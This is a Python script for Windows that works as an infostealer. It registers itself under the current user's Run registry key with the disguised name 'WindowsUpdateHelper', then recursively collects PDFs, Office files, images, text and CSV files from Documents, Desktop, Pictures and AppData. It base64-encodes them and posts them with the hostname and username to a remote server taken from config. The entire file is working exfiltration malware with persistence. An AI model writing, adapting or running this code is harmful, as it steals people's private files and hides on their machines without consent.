import pathlib
import socket
import os
import base64
import requests
import time
import winreg
import datetime
import sys

from config_loader import load_app_config

_cfg = load_app_config()
SERVER_URL = _cfg["send_url"]
API_TOKEN = _cfg["secret_token"]


def add_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(
            key,
            "WindowsUpdateHelper",
            0,
            winreg.REG_SZ,
            f'python "{os.path.abspath(__file__)}"',
        )
        winreg.CloseKey(key)
    except Exception:
        pass


if "--no-persist" not in sys.argv:
    add_persistence()

flag = pathlib.Path(os.environ.get("TEMP", ".")) / "wu_flag.txt"
if "--force" not in sys.argv:
    if flag.exists() and flag.read_text(encoding="utf-8", errors="ignore") == str(
        datetime.date.today()
    ):
        print("[!] Already ran today. Use --force to run again.")
        raise SystemExit(0)
flag.write_text(str(datetime.date.today()), encoding="utf-8")

time.sleep(30)

hostname = socket.gethostname()
username = os.getlogin()
base_path = pathlib.Path(os.environ.get("USERPROFILE", "C:/"))

EXTS = {".pdf", ".docx", ".txt", ".jpg", ".xlsx", ".png", ".csv"}
target_dirs = ["Documents", "Desktop", "Pictures", "AppData"]

for target in target_dirs:
    p = base_path / target
    for f in p.rglob("*"):
        try:
            if f.is_file() and f.suffix.lower() in EXTS and f.stat().st_size < 5_000_000:
                content = base64.b64encode(f.read_bytes()).decode("utf-8")
                rel_name = str(f.relative_to(base_path)).replace("\\", "/")
                r = requests.post(
                    SERVER_URL,
                    json={
                        "hostname": hostname,
                        "username": username,
                        "token": API_TOKEN,
                        "filename": rel_name,
                        "content": content,
                    },
                    timeout=30,
                )
                print(f"[+] Sent {f.name} - Status: {r.status_code}")
        except PermissionError:
            print(f"[-] Permission denied: {f}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
